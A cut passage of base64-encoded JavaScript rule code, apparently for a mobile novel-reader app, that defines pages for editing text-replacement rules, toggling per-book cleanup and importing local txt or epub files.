k7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICAgICAgfVxcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcIuabv+aNouinhOWImeWQjeensFxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5uYW1lXFxcIiwgcmVwbGFjZVJ1bGUubmFtZSksXFxuICAgICAgICBvbkNoYW5nZTogJ3B1dE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLm5hbWVcXFwiLGlucHV0KTsnXFxuICAgIH1cXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwiaW5wdXRcXFwiLFxcbiAgICBkZXNjOiBcXFwi5pu/5o2i6KeE5YiZXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICB0eXBlOiBcXFwidGV4dGFyZWFcXFwiLFxcbiAgICAgICAgaGVpZ2h0OiAtMSxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUucGF0dGVyblxcXCIsIHJlcGxhY2VSdWxlLnBhdHRlcm4pLFxcbiAgICAgICAgb25DaGFuZ2U6ICdwdXRNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5wYXR0ZXJuXFxcIiwgaW5wdXQpOydcXG4gICAgfVxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmmK/lkKbkvb/nlKjmraPliJnooajovr7lvI/vvJpcXFwiICsgZ2V0TXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUuaXNSZWdleFxcXCIpLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKGlkKSA9PiB7XFxuICAgICAgICBsZXQgaXNSZWdleCA9IGdldE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLmlzUmVnZXhcXFwiKSA9PT0gXFxcInRydWVcXFwiID8gZmFsc2UgOiB0cnVlO1xcbiAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IGlkXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuaYr+WQpuS9v+eUqOato+WImeihqOi+vuW8j++8mlxcXCIgKyBpc1JlZ2V4XFxuICAgICAgICB9KTtcXG4gICAgICAgIHB1dE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLmlzUmVnZXhcXFwiLCBcXFwiXFxcIiArIGlzUmVnZXgpO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSwgaWQpLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBpZDogaWRcXG4gICAgfVxcbn0pO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgIGRlc2M6IFxcXCLmm7/mjaLkuLpcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgICAgIHR5cGU6IFxcXCJ0ZXh0YXJlYVxcXCIsXFxuICAgICAgICBoZWlnaHQ6IC0xLFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5yZXBsYWNlbWVudFxcXCIsIHJlcGxhY2VSdWxlLnJlcGxhY2VtZW50KSxcXG4gICAgICAgIG9uQ2hhbmdlOiAncHV0TXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUucmVwbGFjZW1lbnRcXFwiLGlucHV0KTsnXFxuICAgIH1cXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5L+d5a2YXFxcIixcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChyZXBsYWNlUnVsZSwgaXNOZXcsIGluZGV4KSA9PiB7XFxuICAgICAgICBsZXQgcGF0dGVybiA9IGdldE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLnBhdHRlcm5cXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICBpZiAoIXBhdHRlcm4pIHtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5pu/5o2i6KeE5YiZ5LiN6IO95Li656m6XFxcIjtcXG4gICAgICAgIH1cXG4gICAgICAgIE9iamVjdC5hc3NpZ24ocmVwbGFjZVJ1bGUsIHtcXG4gICAgICAgICAgICBuYW1lOiBnZXRNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5uYW1lXFxcIiwgXFxcIlxcXCIpLFxcbiAgICAgICAgICAgIGlzUmVnZXg6IGdldE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLmlzUmVnZXhcXFwiKSA9PT0gXFxcInRydWVcXFwiID8gdHJ1ZSA6IGZhbHNlLFxcbiAgICAgICAgICAgIHBhdHRlcm46IHBhdHRlcm4sXFxuICAgICAgICAgICAgcmVwbGFjZW1lbnQ6IGdldE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLnJlcGxhY2VtZW50XFxcIiwgXFxcIlxcXCIpXFxuICAgICAgICB9KTtcXG4gICAgICAgIGxldCBydWxlTGlzdCA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcInJlcGxhY2VSdWxlLmpzb25cXFwiKSB8fCBcXFwiW11cXFwiKTtcXG4gICAgICAgIGlmIChpc05ldyA9PSBcXFwidHJ1ZVxcXCIpIHtcXG4gICAgICAgICAgICBydWxlTGlzdC5wdXNoKHJlcGxhY2VSdWxlKTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcnVsZUxpc3Quc3BsaWNlKGluZGV4LCAxLCByZXBsYWNlUnVsZSk7XFxuICAgICAgICB9XFxuICAgICAgICBzYXZlRmlsZShcXFwicmVwbGFjZVJ1bGUuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KHJ1bGVMaXN0KSk7XFxuICAgICAgICBiYWNrKCk7XFxuICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5L+d5a2Y5oiQ5YqfXFxcIjtcXG4gICAgfSwgcmVwbGFjZVJ1bGUsIGlzTmV3LCBpbmRleCksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxufSk7XFxuXFxuLypcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwiaW5wdXRcXFwiLFxcbiAgICBkZXNjOiBcXFwi5pu/5o2i6IyD5Zu0XFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICB0eXBlOiBcXFwidGV4dGFyZWFcXFwiLFxcbiAgICAgICAgaGVpZ2h0OiAtMSxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogXFxcIlxcXCIsXFxuICAgICAgICBvbkNoYW5nZTogJ3B1dE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLnNjb3BlXFxcIixpbnB1dCk7J1xcbiAgICB9XFxufSk7XFxuXFxuKi9cXG5zZXRSZXN1bHQobGF5b3V0KTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiN2LuWwj+ivtOS4quaAp+WMluWHgOWMllwiLFwicGF0aFwiOlwiTm92ZWxDdXN0b20udmlld1wiLFwicnVsZVwiOlwianM6XFxuc2V0UGFnZVRpdGxlKFxcXCLmm7/mjaLop4TliJl8XFxcIiArIE1ZX1BBUkFNUy5uYW1lKTtcXG5sZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcIikgfHwgXFxcIltdXFxcIik7XFxubGV0IGlkID0gXFxcIiNcXFwiICsgbmV3IERhdGUoKS5nZXRUaW1lKCk7XFxuXFxuY29uc3QgYm9va0luZm8gPSBPYmplY3QuYXNzaWduKHtcXG4gICAgZm9vdDogMCxcXG4gICAgaXNSZXBsYWNlOiB0cnVlLFxcbiAgICBzZWxlY3RlZDogW11cXG59LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcImZpbGU6Ly9cXFwiICsgTVlfUEFSQU1TLnBhdGggKyBcXFwiL2Jvb2tJbmZvLmpzb25cXFwiKSB8fCBcXFwie31cXFwiKSk7XFxuXFxubGV0IGxheW91dCA9IFtdO1xcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFtcXFwi4piQ5YeA5YyWXFxcIiwgXFxcIuKYkeWHgOWMllxcXCJdWzAgKyBib29rSW5mby5pc1JlcGxhY2VdLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKCRpZCwgcGF0aCkgPT4ge1xcblxcbiAgICAgICAgdmFyIGJvb2tJbmZvID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiL2Jvb2tJbmZvLmpzb25cXFwiKSB8fCBcXFwie31cXFwiKTtcXG4gICAgICAgIGxldCBpc1JlcGxhY2UgPSBib29rSW5mby5pc1JlcGxhY2U9PT11bmRlZmluZWQ/dHJ1ZTpib29rSW5mby5pc1JlcGxhY2U7XFxuICAgICAgICBib29rSW5mby5pc1JlcGxhY2UgPSAhaXNSZXBsYWNlO1xcbiAgICAgICAgd3JpdGVGaWxlKFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiL2Jvb2tJbmZvLmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcbiAgICAgICAgdXBkYXRlSXRlbSgkaWQsIHtcXG4gICAgICAgICAgICB0aXRsZTogaXNSZXBsYWNlID8gXFxcIuKYkOWHgOWMllxcXCIgOiBcXFwi4piR5YeA5YyWXFxcIixcXG4gICAgICAgIH0pO1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgfSwgaWQgKyBcXFwiIy0xXFxcIiwgTVlfUEFSQU1TLnBhdGgpLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgaWQ6IGlkICsgXFxcIiMtMVxcXCJcXG4gICAgfSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIue8lui+keinhOWImVxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nL01vcmUudmlldyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSMjbm9SZWZyZXNoIz9zZXR0aW5nVHlwZT1yZXBsYWNlUnVsZVxcXCIsXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIixcXG4gICAgZXh0cmE6e1xcbiAgICAgICAgaXNSZWZyZXNoOiB0cnVlXFxuICAgIH1cXG59KTtcXG5mb3IgKGxldCBpID0gMCwgbGVuID0gcnVsZUxpc3QubGVuZ3RoOyBpIDwgbGVuOyBpKyspIHtcXG4gICAgbGV0IHJlcGxhY2VSdWxlID0gcnVsZUxpc3RbaV07XFxuICAgIGxldCBpc1RydWUgPSBib29rSW5mby5zZWxlY3RlZC5pbmNsdWRlcyhyZXBsYWNlUnVsZS5pZCk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAoaXNUcnVlID8gXFxcIuKXj1xcXCIgOiBcXFwi4peLXFxcIikgKyByZXBsYWNlUnVsZS5uYW1lLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICB5OiAwLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpc1RydWU6IGlzVHJ1ZSxcXG4gICAgICAgICAgICBpZDogaWQgKyBpLFxcbiAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLlvIDlkK9cXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKCgkaWQsIHJlcGxhY2VSdWxlLCBwYXRoKSA9PiB7XFxuICAgICAgICAgICAgaWYgKGZpbmRJdGVtKCRpZCkuZXh0cmEuaXNUcnVlKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LlvIDlkK9cXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBjb25zdCBib29rSW5mbyA9IE9iamVjdC5hc3NpZ24oe1xcbiAgICAgICAgICAgICAgICBzZWxlY3RlZDogW11cXG4gICAgICAgICAgICB9LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIpIHx8IFxcXCJ7fVxcXCIpKTtcXG4gICAgICAgICAgICBib29rSW5mby5zZWxlY3RlZC5wdXNoKHJlcGxhY2VSdWxlLmlkKTtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKCRpZCwge1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuKXj1xcXCIgKyByZXBsYWNlUnVsZS5uYW1lLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaXNUcnVlOiB0cnVlLFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6ICRpZCxcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgd3JpdGVGaWxlKFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiL2Jvb2tJbmZvLmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICB9LCBpZCArIGksIHJlcGxhY2VSdWxlLCBNWV9QQVJBTVMucGF0aCksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMlxcXCJcXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5YWz6ZetXFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoJGlkLCByZXBsYWNlUnVsZSwgcGF0aCkgPT4ge1xcbiAgICAgICAgICAgIGlmICghZmluZEl0ZW0oJGlkKS5leHRyYS5pc1RydWUpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+W3suWFs+mXrVxcXCI7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGNvbnN0IGJvb2tJbmZvID0gT2JqZWN0LmFzc2lnbih7XFxuICAgICAgICAgICAgICAgIHNlbGVjdGVkOiBbXVxcbiAgICAgICAgICAgIH0sIEpTT04ucGFyc2UocmVxdWVzdChcXFwiZmlsZTovL1xcXCIgKyBwYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIikgfHwgXFxcInt9XFxcIikpO1xcbiAgICAgICAgICAgIGJvb2tJbmZvLnNlbGVjdGVkLnNwbGljZShib29rSW5mby5zZWxlY3RlZC5pbmRleE9mKHJlcGxhY2VSdWxlLmlkKSwgMSk7XFxuICAgICAgICAgICAgdXBkYXRlSXRlbSgkaWQsIHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLil4tcXFwiICsgcmVwbGFjZVJ1bGUubmFtZSxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIGlzVHJ1ZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgICAgICBpZDogJGlkLFxcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIGlkICsgaSwgcmVwbGFjZVJ1bGUsIE1ZX1BBUkFNUy5wYXRoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbiAgICB9KTtcXG59XFxuXFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjdi7lpJblr7zlsI/or7RcIixcInBhdGhcIjpcImV4dGVybmFsaW1wb3J0VHh0LnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmZ1bmN0aW9uIHR4dFZpZXcobGF5b3V0KSB7XFxuICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcbiAgICBsZXQgZmlsZXMgPSBGaWxlLmdldEZpbGVQYXRoKENvbmZpZy5leHRlcm5hbEltcG9ydFBhdGgpO1xcbiAgICBmaWxlcyA9IGZpbGVzLmZpbHRlcih2ID0+IC8oXFxcXC50eHR8XFxcXC5lcHViKSQvLnRlc3Qodi5uYW1lKSk7XFxuXFxuICAgIHNldFBhZ2VUaXRsZShcXFwi5bCP6K+05Lmm5p62XFxcIik7XFxuICAgIC8vbGV0IGxheW91dCA9IFtdO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB1cmw6ICdpbnB1dD9cXFwiaGlrZXI6Ly9wYWdlL3R4dFNlYXJjaC52aWV3I25vUmVmcmVzaCM/c2VhcmNoVGVybXM9XFxcIitlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpOlxcXCJ0b2FzdDovL+ivt+i+k+WFpeWwj+ivtOWQjVxcXCInLFxcbiAgICAgICAgZGVzYzogXFxcIuaQnOe0olxcXCIsXFxuICAgICAgICB0aXRsZTogXFxcIvCflI1cXFwiLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoXFxcInNlYXJjaEtleUJ5VHh0XFxcIiwgXFxcIlxcXCIpLFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiBcXFwicHV0TXlWYXIoJ3NlYXJjaEtleUJ5VHh0JyxpbnB1dClcXFwiXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuWvvOWFpeWwj+ivtFxcXCIsXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfM1xcXCIsXFxuICAgICAgICB1cmw6ICQoW1xcXCLns7vnu5/pgInmi6nlmahcXFwiLCBcXFwi5rW36ZiU6YCJ5oup5ZmoXFxcIl0sIDEsIFxcXCLpgInmi6nlmajnsbvlnotcXFwiKS5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgICAgIGlmIChpbnB1dCA9PT0gXFxcIuezu+e7n+mAieaLqeWZqFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJmaWxlU2VsZWN0Oi8vXFxcIiArICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgaWYgKCEvKFxcXFwudHh0fC5lcHViKSQvaS50ZXN0KGlucHV0KSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KFxcXCLpgInmi6nkuobplJnor6/nmoTmlofku7bnsbvlnotcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICBjb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBmaWxlTWF0Y2ggPSBpbnB1dC5tYXRjaCgvXFxcXC8oW15cXFxcL10qPykoXFxcXC50eHR8XFxcXC5lcHViKSQvaSk7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgbm92ZWxOYW1lID0gZmlsZU1hdGNoWzFdLnJlcGxhY2UoXFxcIl9maWxlU2VsZWN0X1xcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0b3BhdGggPSBDb25maWcuZXh0ZXJuYWxJbXBvcnRQYXRoICsgbm92ZWxOYW1lICsgZmlsZU1hdGNoWzJdO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRvcGF0aENhY2hlID0gQ29uZmlnLmNvbnRlbnRzQ2FjaGUgKyBub3ZlbE5hbWUgKyBmaWxlTWF0Y2hbMl07XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcGF0aCA9IGlucHV0LnJlcGxhY2UoXFxcImZpbGU6Ly9cXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIHRvcGF0aCkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLlr7zlhaXmj5DnpLpcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBcXFwi5bey5a2Y5ZyoW1xcXCIgKyBub3ZlbE5hbWUgKyBcXFwiXeaYr+WQpuimhueblj9cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChwYXRoLCB0b3BhdGgsIHRvcGF0aENhY2hlKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5jb3B5RmlsZShwYXRoLCB0b3BhdGgsIHRydWUpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGVFeGlzdChcXFwiZmlsZTovL1xcXCIgKyB0b3BhdGhDYWNoZSkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWxlLmRlbGV0ZUZpbGVzKHRvcGF0aENhY2hlKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lr7zlhaXmiJDlip9cXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBwYXRoLCB0b3BhdGgsIHRvcGF0aENhY2hlKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjtcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBGaWxlLmNvcHlGaWxlKHBhdGgsIHRvcGF0aCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGVFeGlzdChcXFwiZmlsZTovL1xcXCIgKyB0b3BhdGhDYWNoZSkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5kZWxldGVGaWxlcyh0b3BhdGhDYWNoZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0b2FzdChcXFwi5a+85YWl5oiQ5YqfXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBsZXQgcmVxdWlyZVVybCA9IFxcXCJodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD01MDk5XFxcIjtcXG4gICAgICAgICAgICAgICAgbGV0IGZpbGVTZWxlY3QgPSAkLnJlcXVpcmUocmVxdWlyZVVybCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBmaWxlU2VsZWN0LmZpbGVTZWxlY3Rpb25Vcmkoe1xcbiAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmaWxlTWF0Y2ggPSBQQVRILm1hdGNoKC9cXFxcLyhbXlxcXFwvXSo/KShcXFxcLnR4dHxcXFxcLmVwdWIpJC9pKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgbm92ZWxOYW1lID0gZmlsZU1hdGNoWzFdO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0b3BhdGggPSBDb25maWcuZXh0ZXJuYWxJbXBvcnRQYXRoICsgbm92ZWxOYW1lICsgZmlsZU1hdGNoWzJdO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0b3BhdGhDYWNoZSA9IENvbmZpZy5jb250ZW50c0NhY2hlICsgbm92ZWxOYW1lICsgZmlsZU1hdGNoWzJdO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXRoID0gUEFUSDtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIHRvcGF0aCkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQoXFxcIuW3suWtmOWcqFtcXFwiICsgbm92ZWxOYW1lICsgXFxcIl3mmK/lkKbopobnm5Y/XFxcIikuY29uZmlybSgocGF0aCwgdG9wYXRoLCB0b3BhdGhDYWNoZSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGUuY29weUZpbGUocGF0aCwgdG9wYXRoLCB0cnVlKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlRXhpc3QoXFxcImZpbGU6Ly9cXFwiICsgdG9wYXRoQ2FjaGUpKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5kZWxldGVGaWxlcyh0b3BhdGhDYWNoZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYWNrKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5a+85YWl5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgcGF0aCwgdG9wYXRoLCB0b3BhdGhDYWNoZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIC